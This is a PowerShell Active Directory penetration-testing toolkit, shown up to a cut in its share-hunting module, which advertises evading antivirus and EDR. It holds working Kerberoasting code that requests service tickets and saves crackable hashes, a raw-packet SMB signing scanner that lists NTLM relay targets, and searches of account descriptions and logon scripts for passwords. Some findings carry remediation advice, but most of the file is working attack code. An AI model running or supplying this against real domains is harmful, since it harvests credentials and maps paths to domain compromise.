<#
.SYNOPSIS
    ADPentestKit.ps1 - Active Directory Penetration Testing Toolkit
    Pure PowerShell, no external tools required. Designed for authorized engagements.

.DESCRIPTION
    Comprehensive AD enumeration and exploitation toolkit using only native
    .NET/PowerShell classes (System.DirectoryServices, System.Net, System.IdentityModel).
    Bypasses most AV/EDR by avoiding known tool signatures.

    Modules:
      1.  Domain Enumeration        - Domain info, trusts, functional level
      2.  User Enumeration          - DA accounts, password ages, stale accounts
      3.  Kerberoast                - Extract TGS hashes for offline cracking
      4.  AS-REProast Check         - Find accounts without preauth
      5.  Delegation Check          - Constrained/unconstrained delegation
      6.  SMB Signing Scan          - Find NTLM relay targets
      7.  OS Version Inventory      - Find legacy/vulnerable systems
      8.  Share Hunting              - Enumerate and search readable shares
      9.  Credential Search         - Search shares for passwords/keys
      10. LAPS Check                - Attempt to read LAPS passwords
      11. ADCS Enumeration          - ESC1-ESC8 vulnerability check
      12. GPP Password Search       - Group Policy Preferences cpassword
      13. Service Account Analysis  - SPNs, password ages, privileges
      14. Machine Account Quota     - RBCD attack feasibility
      15. Spooler/WebDAV/Pipe Check - Coercion attack surface
      16. GPO Permission Check      - Writable GPOs
      17. Local Privesc Check       - Token privs, unquoted paths, AlwaysInstallElevated
      18. SQL Exploitation          - Connect with found creds, check sysadmin, xp_cmdshell
      19. Admin Access Scan         - Test C$ access on all live hosts

.PARAMETER Modules
    Comma-separated list of module numbers to run, or 'All' for everything.
    Example: -Modules "1,2,3,6,8"

.PARAMETER OutputDir
    Directory to save results. Defaults to .\ADPentestKit_Results

.PARAMETER TargetSubnets
    Comma-separated subnets for ping sweep. Example: "192.168.4.0/24,10.0.0.0/24"

.PARAMETER SqlServer
    SQL Server to test (for module 18). Example: "Server\Instance"

.PARAMETER SqlUser
    SQL username (for module 18)

.PARAMETER SqlPass
    SQL password (for module 18)

.EXAMPLE
    .\ADPentestKit.ps1 -Modules All
    .\ADPentestKit.ps1 -Modules "1,2,3,6"
    .\ADPentestKit.ps1 -Modules "18" -SqlServer "Noga\EZMATCH" -SqlUser "sa" -SqlPass "password123"
#>

[CmdletBinding()]
param(
    [string]$Modules = "All",
    [string]$OutputDir = ".\ADPentestKit_Results",
    [string]$TargetSubnets = "",
    [string]$SqlServer = "",
    [string]$SqlUser = "",
    [string]$SqlPass = "",
    [string]$SqlCommand = ""
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'SilentlyContinue'

# ============================================================
# GLOBALS & HELPERS
# ============================================================
$script:Findings = @()
$script:LiveHosts = @()
$script:StartTime = Get-Date

function Write-Banner {
    $banner = @"

    ╔═══════════════════════════════════════════════╗
    ║         AD Pentest Kit v1.0                   ║
    ║   Pure PowerShell - No External Tools         ║
    ║   For Authorized Engagements Only             ║
    ╚═══════════════════════════════════════════════╝

"@
    Write-Host $banner -ForegroundColor Cyan
    Write-Host "  Started: $($script:StartTime)" -ForegroundColor Gray
    Write-Host "  User:    $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Gray
    Write-Host "  Host:    $env:COMPUTERNAME" -ForegroundColor Gray
    Write-Host ""
}

function Add-Finding {
    param(
        [string]$Module,
        [ValidateSet('Critical','High','Medium','Low','Info')]
        [string]$Severity,
        [string]$Title,
        [string]$Detail,
        [string]$Remediation = ""
    )
    $script:Findings += [PSCustomObject]@{
        Module       = $Module
        Severity     = $Severity
        Title        = $Title
        Detail       = $Detail
        Remediation  = $Remediation
        Timestamp    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    }
    $color = switch ($Severity) {
        'Critical' { 'Red' }
        'High'     { 'Yellow' }
        'Medium'   { 'DarkYellow' }
        'Low'      { 'White' }
        'Info'     { 'Gray' }
    }
    Write-Host "  [$Severity] $Title" -ForegroundColor $color
    if ($Detail) { Write-Host "    $Detail" -ForegroundColor Gray }
}

function Get-LDAPSearcher {
    param(
        [string]$Filter,
        [string[]]$Properties,
        [string]$SearchRoot = "",
        [int]$PageSize = 200
    )
    $searcher = if ($SearchRoot) {
        New-Object DirectoryServices.DirectorySearcher(
            (New-Object DirectoryServices.DirectoryEntry("LDAP://$SearchRoot")))
    } else {
        New-Object DirectoryServices.DirectorySearcher
    }
    $searcher.Filter = $Filter
    $searcher.PageSize = $PageSize
    if ($Properties) { $searcher.PropertiesToLoad.AddRange($Properties) }
    return $searcher
}

function Ensure-OutputDir {
    if (-not (Test-Path $OutputDir)) {
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    }
}

# ============================================================
# MODULE 1: Domain Enumeration
# ============================================================
function Invoke-DomainEnum {
    Write-Host "`n[Module 1] Domain Enumeration" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $rootDSE = [ADSI]"LDAP://RootDSE"
    $domainDN = $rootDSE.defaultNamingContext.ToString()
    $configDN = $rootDSE.configurationNamingContext.ToString()
    $forestDN = $rootDSE.rootDomainNamingContext.ToString()
    $schemaDN = $rootDSE.schemaNamingContext.ToString()

    Write-Host "  Domain DN:  $domainDN" -ForegroundColor Cyan
    Write-Host "  Forest DN:  $forestDN" -ForegroundColor Cyan
    Write-Host "  Config DN:  $configDN" -ForegroundColor Cyan

    # Domain functional level
    $domObj = [ADSI]"LDAP://$domainDN"
    $funcLevel = $domObj.Properties["msDS-Behavior-Version"].Value
    $levelMap = @{0='2000';1='2003 Interim';2='2003';3='2008';4='2008 R2';5='2012';6='2012 R2';7='2016'}
    $levelStr = if ($levelMap.ContainsKey([int]$funcLevel)) { $levelMap[[int]$funcLevel] } else { "Unknown ($funcLevel)" }
    Write-Host "  Domain Functional Level: $levelStr" -ForegroundColor Cyan
    Add-Finding -Module "DomainEnum" -Severity "Info" -Title "Domain: $domainDN" -Detail "Functional Level: $levelStr"

    # Domain Controllers
    Write-Host "`n  Domain Controllers:" -ForegroundColor Cyan
    $dcSearcher = Get-LDAPSearcher -Filter "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -Properties @("dNSHostName","operatingSystem","operatingSystemVersion")
    $dcSearcher.FindAll() | ForEach-Object {
        $dcName = $_.Properties["dnshostname"] | Select-Object -First 1
        $dcOS = $_.Properties["operatingsystem"] | Select-Object -First 1
        $dcVer = $_.Properties["operatingsystemversion"] | Select-Object -First 1
        Write-Host "    $dcName | $dcOS ($dcVer)" -ForegroundColor White
        Add-Finding -Module "DomainEnum" -Severity "Info" -Title "DC: $dcName" -Detail "$dcOS $dcVer"
    }

    # Trusts
    Write-Host "`n  Domain Trusts:" -ForegroundColor Cyan
    $trustSearcher = Get-LDAPSearcher -Filter "(objectClass=trustedDomain)" -Properties @("name","trustDirection","trustType","trustAttributes")
    $trusts = $trustSearcher.FindAll()
    if ($trusts.Count -eq 0) {
        Write-Host "    No trusts found" -ForegroundColor Gray
    } else {
        foreach ($trust in $trusts) {
            $tName = $trust.Properties["name"] | Select-Object -First 1
            $tDir = switch ([int]($trust.Properties["trustdirection"] | Select-Object -First 1)) {
                0 {"Disabled"}; 1 {"Inbound"}; 2 {"Outbound"}; 3 {"Bidirectional"}; default {"Unknown"}
            }
            Write-Host "    $tName (Direction: $tDir)" -ForegroundColor White
            Add-Finding -Module "DomainEnum" -Severity "Info" -Title "Trust: $tName" -Detail "Direction: $tDir"
        }
    }

    # Password Policy
    Write-Host "`n  Domain Password Policy:" -ForegroundColor Cyan
    $domPolicy = [ADSI]"LDAP://$domainDN"
    $lockoutThreshold = $domPolicy.Properties["lockoutThreshold"].Value
    $lockoutDuration = $domPolicy.Properties["lockoutDuration"].Value
    $lockoutWindow = $domPolicy.Properties["lockoutObservationWindow"].Value
    $minPwdLen = $domPolicy.Properties["minPwdLength"].Value
    $pwdHistory = $domPolicy.Properties["pwdHistoryLength"].Value
    $complexity = $domPolicy.Properties["pwdProperties"].Value

    # Convert 100ns intervals to minutes
    $lockoutDurMin = if ($lockoutDuration) { [Math]::Abs([Int64]$lockoutDuration / 600000000) } else { "N/A" }
    $lockoutWinMin = if ($lockoutWindow) { [Math]::Abs([Int64]$lockoutWindow / 600000000) } else { "N/A" }

    Write-Host "    Min Password Length:  $minPwdLen" -ForegroundColor White
    Write-Host "    Password History:     $pwdHistory" -ForegroundColor White
    Write-Host "    Complexity Required:  $(($complexity -band 1) -ne 0)" -ForegroundColor White
    Write-Host "    Lockout Threshold:    $lockoutThreshold" -ForegroundColor $(if ($lockoutThreshold -eq 0) { 'Red' } else { 'White' })
    Write-Host "    Lockout Duration:     $lockoutDurMin min" -ForegroundColor White
    Write-Host "    Lockout Window:       $lockoutWinMin min" -ForegroundColor White

    if ($lockoutThreshold -eq 0) {
        Add-Finding -Module "DomainEnum" -Severity "High" -Title "No Account Lockout Policy" `
            -Detail "Lockout threshold is 0 - unlimited password guessing possible" `
            -Remediation "Set account lockout threshold to 5-10 attempts"
    }
    if ($minPwdLen -lt 12) {
        Add-Finding -Module "DomainEnum" -Severity "Medium" -Title "Weak Minimum Password Length ($minPwdLen)" `
            -Detail "Minimum password length is $minPwdLen characters" `
            -Remediation "Set minimum password length to 14+ characters"
    }
}

# ============================================================
# MODULE 2: User Enumeration (Focus on privileged accounts)
# ============================================================
function Invoke-UserEnum {
    Write-Host "`n[Module 2] Privileged User Enumeration" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $privGroups = @(
        @{Name="Domain Admins"; DN="CN=Domain Admins,CN=Users"},
        @{Name="Enterprise Admins"; DN="CN=Enterprise Admins,CN=Users"},
        @{Name="Schema Admins"; DN="CN=Schema Admins,CN=Users"},
        @{Name="Administrators"; DN="CN=Administrators,CN=Builtin"}
    )

    $domainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext.ToString()

    foreach ($group in $privGroups) {
        Write-Host "`n  $($group.Name):" -ForegroundColor Cyan
        $fullDN = "$($group.DN),$domainDN"
        $searcher = Get-LDAPSearcher -Filter "(&(objectClass=user)(memberOf=$fullDN))" `
            -Properties @("sAMAccountName","pwdLastSet","lastLogon","userAccountControl",
                         "description","adminCount","servicePrincipalName","memberOf")

        $searcher.FindAll() | ForEach-Object {
            $sam = $_.Properties["samaccountname"] | Select-Object -First 1
            $uac = [int]($_.Properties["useraccountcontrol"] | Select-Object -First 1)
            $disabled = ($uac -band 2) -ne 0
            $pwdSet = try { [DateTime]::FromFileTimeUtc([Int64]($_.Properties["pwdlastset"] | Select-Object -First 1)) } catch { $null }
            $lastLogon = try { [DateTime]::FromFileTimeUtc([Int64]($_.Properties["lastlogon"] | Select-Object -First 1)) } catch { $null }
            $spns = @($_.Properties["serviceprincipalname"])
            $desc = $_.Properties["description"] | Select-Object -First 1
            $pwdAge = if ($pwdSet) { ((Get-Date) - $pwdSet).Days } else { "N/A" }

            $color = if ($disabled) { 'DarkGray' }
                     elseif ($pwdAge -is [int] -and $pwdAge -gt 365) { 'Red' }
                     elseif ($pwdAge -is [int] -and $pwdAge -gt 180) { 'Yellow' }
                     else { 'White' }

            $logonStr = if ($lastLogon) { $lastLogon.ToString('yyyy-MM-dd') } else { "Never" }
            $pwdStr = if ($pwdSet) { "$pwdAge`d ($($pwdSet.ToString('yyyy-MM-dd')))" } else { "Never set" }
            $spnStr = if ($spns.Count -gt 0 -and $spns[0]) { " [HAS SPNs - KERBEROASTABLE]" } else { "" }

            Write-Host "    $sam | PwdAge: $pwdStr | LastLogon: $logonStr | Disabled: $disabled$spnStr" -ForegroundColor $color

            if ($spns.Count -gt 0 -and $spns[0] -and -not $disabled) {
                Add-Finding -Module "UserEnum" -Severity "Critical" `
                    -Title "Kerberoastable Privileged Account: $sam" `
                    -Detail "Member of $($group.Name) with SPNs: $($spns -join ', ')" `
                    -Remediation "Remove SPNs or use Group Managed Service Accounts (gMSA)"
            }

            if ($desc -match 'pass|pwd|cred|secret') {
                Add-Finding -Module "UserEnum" -Severity "High" `
                    -Title "Potential Password in Description: $sam" `
                    -Detail "Description: $desc" `
                    -Remediation "Remove credentials from account descriptions"
            }

            if ($pwdAge -is [int] -and $pwdAge -gt 365 -and -not $disabled) {
                Add-Finding -Module "UserEnum" -Severity "Medium" `
                    -Title "Stale Password on Privileged Account: $sam" `
                    -Detail "Password is $pwdAge days old (member of $($group.Name))" `
                    -Remediation "Enforce regular password rotation for privileged accounts"
            }
        }
    }

    # Check for password in description on ALL users
    Write-Host "`n  Checking all user descriptions for credentials..." -ForegroundColor Cyan
    $allUsers = Get-LDAPSearcher -Filter "(&(objectClass=user)(objectCategory=person))" -Properties @("sAMAccountName","description")
    $allUsers.FindAll() | ForEach-Object {
        $desc = $_.Properties["description"] | Select-Object -First 1
        $sam = $_.Properties["samaccountname"] | Select-Object -First 1
        if ($desc -match 'pass|pwd|cred|secret|password') {
            Write-Host "    [HIT] $sam - $desc" -ForegroundColor Red
            Add-Finding -Module "UserEnum" -Severity "High" `
                -Title "Potential Password in Description: $sam" `
                -Detail "Description: $desc" `
                -Remediation "Remove credentials from account descriptions"
        }
    }
}

# ============================================================
# MODULE 3: Kerberoast
# ============================================================
function Invoke-Kerberoast {
    Write-Host "`n[Module 3] Kerberoasting" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    Add-Type -AssemblyName System.IdentityModel

    $searcher = Get-LDAPSearcher `
        -Filter "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(samAccountName=krbtgt)))" `
        -Properties @("sAMAccountName","servicePrincipalName","pwdLastSet","memberOf","distinguishedName")

    $results = $searcher.FindAll()
    $hashCount = 0

    foreach ($result in $results) {
        $sam = $result.Properties["samaccountname"] | Select-Object -First 1
        $spns = @($result.Properties["serviceprincipalname"])
        $pwdSet = try { [DateTime]::FromFileTimeUtc([Int64]($result.Properties["pwdlastset"] | Select-Object -First 1)).ToString('yyyy-MM-dd') } catch { "Unknown" }
        $groups = @($result.Properties["memberof"]) | ForEach-Object { ($_ -split ',')[0] -replace '^CN=','' }
        $isPriv = $groups -match 'Admin|Domain'

        $targetSPN = $spns | Select-Object -First 1
        Write-Host "  Requesting TGS for $sam ($targetSPN)..." -ForegroundColor $(if ($isPriv) { 'Red' } else { 'White' })

        try {
            $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $targetSPN
            $ticketBytes = $ticket.GetRequest()

            # Parse ASN.1 to extract encrypted part
            $hash = $null
            # Find the AP-REQ encrypted part
            for ($i = 0; $i -lt $ticketBytes.Length - 4; $i++) {
                # Look for encryption type in the ticket
                if ($ticketBytes[$i] -eq 0xA3 -and $ticketBytes[$i+2] -eq 0x03 -and $ticketBytes[$i+4] -eq 0x02) {
                    $etypeOffset = $i + 5
                    $etypeLen = $ticketBytes[$etypeOffset]
                    $etype = 0
                    for ($j = 0; $j -lt $etypeLen; $j++) {
                        $etype = ($etype -shl 8) + $ticketBytes[$etypeOffset + 1 + $j]
                    }

                    # Find cipher text (tag 0xA2 after etype)
                    for ($k = $etypeOffset + $etypeLen + 1; $k -lt $ticketBytes.Length - 2; $k++) {
                        if ($ticketBytes[$k] -eq 0xA2) {
                            # Parse length
                            $cipherStart = $k + 2
                            if ($ticketBytes[$k+1] -ge 0x82) {
                                $lenBytes = $ticketBytes[$k+1] - 0x80
                                $cipherLen = 0
                                for ($l = 0; $l -lt $lenBytes; $l++) {
                                    $cipherLen = ($cipherLen -shl 8) + $ticketBytes[$cipherStart + $l]
                                }
                                $cipherStart += $lenBytes
                            } elseif ($ticketBytes[$k+1] -eq 0x81) {
                                $cipherLen = $ticketBytes[$k+2]
                                $cipherStart = $k + 3
                            } else {
                                $cipherLen = $ticketBytes[$k+1]
                            }

                            # Skip OCTET STRING tag
                            if ($ticketBytes[$cipherStart] -eq 0x04) {
                                $cipherStart++
                                if ($ticketBytes[$cipherStart] -ge 0x82) {
                                    $lb = $ticketBytes[$cipherStart] - 0x80
                                    $cipherStart += 1 + $lb
                                } elseif ($ticketBytes[$cipherStart] -eq 0x81) {
                                    $cipherStart += 2
                                } else {
                                    $cipherStart++
                                }
                            }

                            $cipherHex = [BitConverter]::ToString($ticketBytes[$cipherStart..($ticketBytes.Length-1)]) -replace '-',''
                            $hash = "`$krb5tgs`$$etype`$*$sam`$$($env:USERDNSDOMAIN)`$${targetSPN}*`$$($cipherHex.Substring(0,32))`$$($cipherHex.Substring(32))"
                            break
                        }
                    }
                    break
                }
            }

            if ($hash) {
                $hashCount++
                $hashFile = Join-Path $OutputDir "kerberoast_${sam}.hash"
                $hash | Out-File -FilePath $hashFile -Encoding ASCII
                Write-Host "    [+] Hash saved to $hashFile (etype $etype)" -ForegroundColor Green
                $severity = if ($isPriv) { "Critical" } else { "High" }
                Add-Finding -Module "Kerberoast" -Severity $severity `
                    -Title "Kerberoastable: $sam (etype $etype)" `
                    -Detail "SPN: $targetSPN | PwdSet: $pwdSet | Groups: $($groups -join ', ')" `
                    -Remediation "Use gMSA, set AES-only encryption, enforce 25+ char passwords"
            }
        } catch {
            Write-Host "    [-] Failed: $($_.Exception.Message)" -ForegroundColor Gray
        }
    }
    Write-Host "`n  Total hashes extracted: $hashCount" -ForegroundColor $(if ($hashCount -gt 0) { 'Green' } else { 'Gray' })
}

# ============================================================
# MODULE 4: AS-REProast Check
# ============================================================
function Invoke-ASREPCheck {
    Write-Host "`n[Module 4] AS-REProast Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $searcher = Get-LDAPSearcher `
        -Filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties @("sAMAccountName","pwdLastSet","memberOf")

    $results = $searcher.FindAll()
    if ($results.Count -eq 0) {
        Write-Host "  No accounts with DONT_REQUIRE_PREAUTH found" -ForegroundColor Gray
    } else {
        foreach ($r in $results) {
            $sam = $r.Properties["samaccountname"] | Select-Object -First 1
            Write-Host "  [VULN] $sam - Pre-auth not required!" -ForegroundColor Red
            Add-Finding -Module "ASREPRoast" -Severity "High" `
                -Title "AS-REP Roastable: $sam" `
                -Detail "Account does not require Kerberos pre-authentication" `
                -Remediation "Enable Kerberos pre-authentication"
        }
    }
}

# ============================================================
# MODULE 5: Delegation Check
# ============================================================
function Invoke-DelegationCheck {
    Write-Host "`n[Module 5] Delegation Check" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    # Unconstrained delegation (excluding DCs)
    Write-Host "`n  Unconstrained Delegation:" -ForegroundColor Cyan
    $unconstrained = Get-LDAPSearcher `
        -Filter "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" `
        -Properties @("sAMAccountName","dNSHostName","objectClass")
    $unconstrained.FindAll() | ForEach-Object {
        $name = ($_.Properties["samaccountname"] | Select-Object -First 1)
        Write-Host "    [VULN] $name - Unconstrained Delegation" -ForegroundColor Red
        Add-Finding -Module "Delegation" -Severity "Critical" `
            -Title "Unconstrained Delegation: $name" `
            -Detail "Can extract TGTs from any user authenticating to this system" `
            -Remediation "Replace with constrained delegation or RBCD"
    }

    # Constrained delegation
    Write-Host "`n  Constrained Delegation:" -ForegroundColor Cyan
    $constrained = Get-LDAPSearcher `
        -Filter "(msDS-AllowedToDelegateTo=*)" `
        -Properties @("sAMAccountName","msDS-AllowedToDelegateTo","userAccountControl")
    $constrained.FindAll() | ForEach-Object {
        $name = $_.Properties["samaccountname"] | Select-Object -First 1
        $targets = @($_.Properties["msds-allowedtodelegateto"]) -join ', '
        $uac = [int]($_.Properties["useraccountcontrol"] | Select-Object -First 1)
        $proto = if ($uac -band 16777216) { "ANY protocol (T2A4D)" } else { "Kerberos only" }
        Write-Host "    $name -> $targets ($proto)" -ForegroundColor Yellow
        $sev = if ($proto -match 'ANY') { "High" } else { "Medium" }
        Add-Finding -Module "Delegation" -Severity $sev `
            -Title "Constrained Delegation: $name" `
            -Detail "Targets: $targets | Protocol: $proto" `
            -Remediation "Review delegation targets, prefer RBCD"
    }

    # RBCD
    Write-Host "`n  Resource-Based Constrained Delegation:" -ForegroundColor Cyan
    $rbcd = Get-LDAPSearcher -Filter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" `
        -Properties @("sAMAccountName","msDS-AllowedToActOnBehalfOfOtherIdentity")
    $rbcd.FindAll() | ForEach-Object {
        $name = $_.Properties["samaccountname"] | Select-Object -First 1
        Write-Host "    $name has RBCD configured" -ForegroundColor Yellow
        Add-Finding -Module "Delegation" -Severity "Medium" `
            -Title "RBCD configured on: $name" -Detail "Review allowed principals"
    }

    if ($unconstrained.FindAll().Count -eq 0 -and $constrained.FindAll().Count -eq 0 -and $rbcd.FindAll().Count -eq 0) {
        Write-Host "    No delegation configurations found" -ForegroundColor Gray
    }
}

# ============================================================
# MODULE 6: SMB Signing Scan
# ============================================================
function Invoke-SMBSigningScan {
    Write-Host "`n[Module 6] SMB Signing Scan" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    # Get targets from AD
    $targets = @()
    $compSearcher = Get-LDAPSearcher -Filter "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties @("dNSHostName","operatingSystem")
    $compSearcher.FindAll() | ForEach-Object {
        $dns = $_.Properties["dnshostname"] | Select-Object -First 1
        $os = $_.Properties["operatingsystem"] | Select-Object -First 1
        if ($dns) { $targets += [PSCustomObject]@{Name=$dns; OS=$os} }
    }

    Write-Host "  Scanning $($targets.Count) hosts for SMB signing..." -ForegroundColor Gray
    $noSigning = @()

    foreach ($t in $targets) {
        try {
            $ip = [System.Net.Dns]::GetHostAddresses($t.Name) |
                  Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
            if (-not $ip) { continue }

            $tcp = New-Object System.Net.Sockets.TcpClient
            $tcp.Connect($ip.ToString(), 445)
            $stream = $tcp.GetStream()
            $stream.ReadTimeout = 2000

            [byte[]]$pkt = @(
                0x00,0x00,0x00,0x72,
                0xFE,0x53,0x4D,0x42, 0x40,0x00, 0x00,0x00, 0x00,0x00,0x00,0x00,
                0x00,0x00, 0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x24,0x00, 0x05,0x00, 0x01,0x00, 0x00,0x00,
                0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x00, 0x00,0x00, 0x00,0x00,
                0x02,0x02, 0x10,0x02, 0x00,0x03, 0x02,0x03, 0x11,0x03
            )
            $stream.Write($pkt, 0, $pkt.Length)
            $stream.Flush()

            $buf = New-Object byte[] 512
            $n = $stream.Read($buf, 0, 512)
            $tcp.Close()

            if ($n -gt 72) {
                $secMode = [BitConverter]::ToUInt16($buf, 70)
                $dialect = [BitConverter]::ToUInt16($buf, 72)
                $sigRequired = ($secMode -band 0x02) -ne 0
                $dialectStr = switch ($dialect) {
                    0x0202 {"2.0.2"}; 0x0210 {"2.1"}; 0x0300 {"3.0"}
                    0x0302 {"3.0.2"}; 0x0311 {"3.1.1"}; default {"$dialect"}
                }

                if (-not $sigRequired) {
                    $noSigning += $t.Name
                    Write-Host "  [NO SIGNING] $($t.Name) ($ip) - SMB $dialectStr - $($t.OS)" -ForegroundColor Red
                }
            }
        } catch { }
    }

    Write-Host "`n  $($noSigning.Count) hosts without SMB signing requirement" -ForegroundColor $(if ($noSigning.Count -gt 0) { 'Red' } else { 'Green' })

    if ($noSigning.Count -gt 0) {
        # Check if DCs are in the list
        $dcSearcher = Get-LDAPSearcher -Filter "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -Properties @("dNSHostName")
        $dcNames = @($dcSearcher.FindAll() | ForEach-Object { $_.Properties["dnshostname"] | Select-Object -First 1 })
        $dcNoSign = $noSigning | Where-Object { $_ -in $dcNames }

        if ($dcNoSign) {
            Add-Finding -Module "SMBSigning" -Severity "Critical" `
                -Title "SMB Signing Disabled on Domain Controllers" `
                -Detail "DCs without signing: $($dcNoSign -join ', ')" `
                -Remediation "Enable and require SMB signing via GPO on all DCs"
        }

        Add-Finding -Module "SMBSigning" -Severity "High" `
            -Title "SMB Signing Disabled on $($noSigning.Count) hosts" `
            -Detail "NTLM relay attacks possible against: $($noSigning[0..9] -join ', ')$(if ($noSigning.Count -gt 10) { '...' })" `
            -Remediation "Enable and require SMB signing domain-wide via GPO"

        $noSigning | Out-File (Join-Path $OutputDir "smb_nosigning.txt") -Encoding ASCII
    }
}

# ============================================================
# MODULE 7: OS Version Inventory
# ============================================================
function Invoke-OSInventory {
    Write-Host "`n[Module 7] OS Version Inventory" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $searcher = Get-LDAPSearcher `
        -Filter "(&(objectClass=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties @("dNSHostName","operatingSystem","operatingSystemVersion","lastLogonTimestamp")

    $legacy = @()
    $eol = @()
    $all = @()

    $searcher.FindAll() | ForEach-Object {
        $name = $_.Properties["dnshostname"] | Select-Object -First 1
        $os = $_.Properties["operatingsystem"] | Select-Object -First 1
        $ver = $_.Properties["operatingsystemversion"] | Select-Object -First 1
        $lastLogon = try {
            [DateTime]::FromFileTimeUtc([Int64]($_.Properties["lastlogontimestamp"] | Select-Object -First 1))
        } catch { $null }

        if (-not $lastLogon -or $lastLogon -lt (Get-Date).AddDays(-90)) { return }

        $all += [PSCustomObject]@{Name=$name; OS=$os; Ver=$ver; LastSeen=$lastLogon.ToString('yyyy-MM-dd')}

        if ($os -match '2003|2000|XP|Vista|Windows 7|2008(?! R2)') {
            $legacy += $name
            Write-Host "  [CRITICAL] $name | $os $ver" -ForegroundColor Red
        } elseif ($os -match '2008 R2|2012|Windows 8') {
            $eol += $name
            Write-Host "  [EOL] $name | $os $ver" -ForegroundColor Yellow
        } elseif ($os -match '2016') {
            Write-Host "  [AGING] $name | $os $ver" -ForegroundColor DarkYellow
        }
    }

    if ($legacy.Count -gt 0) {
        Add-Finding -Module "OSInventory" -Severity "Critical" `
            -Title "$($legacy.Count) Legacy/Unsupported OS Systems" `
            -Detail ($legacy -join ', ') `
            -Remediation "Decommission or isolate systems running unsupported operating systems"
    }
    if ($eol.Count -gt 0) {
        Add-Finding -Module "OSInventory" -Severity "High" `
            -Title "$($eol.Count) End-of-Life OS Systems" `
            -Detail ($eol -join ', ') `
            -Remediation "Plan migration to supported operating systems"
    }

    $all | Export-Csv (Join-Path $OutputDir "os_inventory.csv") -NoTypeInformation
    Write-Host "`n  Total active systems: $($all.Count) | Legacy: $($legacy.Count) | EOL: $($eol.Count)" -ForegroundColor Cyan
}

# ============================================================
# MODULE 8: Share Hunting
# ============================================================
function Invoke-ShareHunt {
    Write-Host "`n[Module 8] Share Hunting" -ForegroundColor Magenta
    Write-Host ("=" * 50)

    $servers = @()
    # Get all servers from AD
    $srvSearcher = Get-LDAPSearcher `
        -Filter "(&(objectClass=computer)(operatingSystem=*Server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" `
        -Properties @("dNSHostName","operatingSystem")
    $srvSearcher.FindAll() | ForEach-Object {
        $name = $_.Properties["dnshostname"] | Select-Object -First 1
        if ($name) { $servers += $name }
    }

    # Also check NETLOGON scripts for additional servers
    $dcSearcher = Get-LDAPSearcher -Filter "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -Properties @("dNSHostName")
    $dcSearcher.FindAll() | ForEach-Object {
        $dcName = $_.Properties["dnshostname"] | Select-Object -First 1
        $logonScripts = Get-ChildItem "\\$dcName\NETLOGON" -Include *.bat,*.cmd,*.ps1,*.vbs -Recurse -ErrorAction SilentlyContinue
        foreach ($script in $logonScripts) {
            $content = Get-Content $script.FullName -ErrorAction SilentlyContinue
            $netUseMatches = $content | Select-String -Pattern '\\\\([^\s\\]+)\\' -AllMatches
            foreach ($m in $netUseMatches) {
                foreach ($match in $m.Matches) {
                    $srvName = $match.Groups[1].Value
                    if ($srvName -notin $servers -and $srvName -ne $dcName) {
                        $servers += $srvName
                        Write-Host "  [+] Discovered from logon script: $srvName" -ForegroundColor Yellow
                    }
                }
            }
            # Check for creds in logon scripts
            $credHits = $content | Select-String -Pattern 'password|pwd|pass=' -AllMatches
            if ($credHits) {
                Add-Finding -Module "ShareHunt" -Severity "Critical" `
                    -Title "Credentials in Logon Script: $($script.FullName)" `
                    -Detail ($credHits | Select-Object -First 3 | ForEach-Object { $_.Line.Trim() }) -join "`n" `
                    -Remediation "Remove hardcoded credentials from logon scripts"
            }
        }
    }

    Write-Host "  Enumerating shares on $($servers.Count) servers..." -ForegroundColor Gray
    $readableShares = @()

    foreach ($srv in $servers) {
        $shares = net view "\\$srv" 2>$null | Where-Object { $_ -match '\s+Disk\s+' }
        foreach ($line in $shares) {
            $shareName = ($line -split '\s+')[0]
            if ($shareName -in @('ADMIN$','C$','D$','IPC$','print$','SYSVOL','NETLOGON')) { continue }

            $sharePath = "\\$srv\$shareName"
            try {
                $items = @(Get-ChildItem $sharePath -ErrorAction Stop | Select-Object -First 1)
                if ($items -or $true) {
                    $readableShares += $sharePath
                    Write-Host "  [READABLE] $sharePath" -ForegroundColor Green
                }
            } catch {
                if ($_.Exception.Message -match 'Access') {
                    Write-Host "  [DENIED]   $sharePath" -ForegroundColor Gray
                }
            }
        }
    }

    if ($readableShares.Count -gt 0) {
        $readableShares | Out-File (Join-Path $OutputDir "readable_shares.txt") -Encoding ASCII
